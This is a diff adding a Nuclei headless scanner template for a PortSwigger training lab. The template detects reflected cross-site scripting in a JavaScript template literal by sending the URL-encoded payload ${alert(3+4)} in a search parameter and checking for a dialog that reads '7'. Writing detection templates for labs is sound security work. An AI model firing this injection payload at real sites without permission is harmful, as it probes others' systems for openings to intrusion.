@@ -1,0 +1,28 @@
+# run with flag $ nuclei -headless
+
+id: lab-javascript-template-literal-angle-brackets
+
+info:
+  name: xss_lab-javascript-template-literal-angle-brackets-single-double-quotes-backslash-backticks-escaped
+  author: FIR_UIII
+  severity: high
+  description: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped
+  tags: XSS,portswigger
+
+headless:
+  - steps:
+      - args:
+          url: "{{BaseURL}}/?search=%24%7Balert%283%2B4%29%7D"
+        action: navigate
+
+      - action: waitdialog
+        name: reflected_topicId_query
+
+    matchers-condition: and
+    
+    matchers:
+      - type: dsl
+        dsl:
+          - reflected_topicId_query == true
+          - reflected_topicId_query_message == "7" # 3+4
+        condition: and
